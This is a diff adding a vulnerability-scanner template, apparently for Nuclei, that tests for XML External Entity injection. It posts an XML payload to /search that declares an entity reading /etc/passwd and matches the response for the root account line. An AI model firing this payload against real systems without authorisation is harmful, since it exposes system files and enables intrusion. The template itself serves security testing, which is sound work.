@@ -1,0 +1,28 @@
+id: xxe-via-search-lfi
+
+info:
+  name: XXE via query parameter
+  author: reewardius
+  severity: high
+  tags: xxe,generic
+  
+http:
+  - raw:
+      - |
+        POST /search HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+        Content-Type: application/xml;charset=UTF-8
+        
+        <?xml version="1.0"?>
+        <!DOCTYPE r [
+        <!ELEMENT r ANY >
+        <!ENTITY sp SYSTEM "file:///etc/passwd">
+        ]>
+        <r>&sp;</r>
+        
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
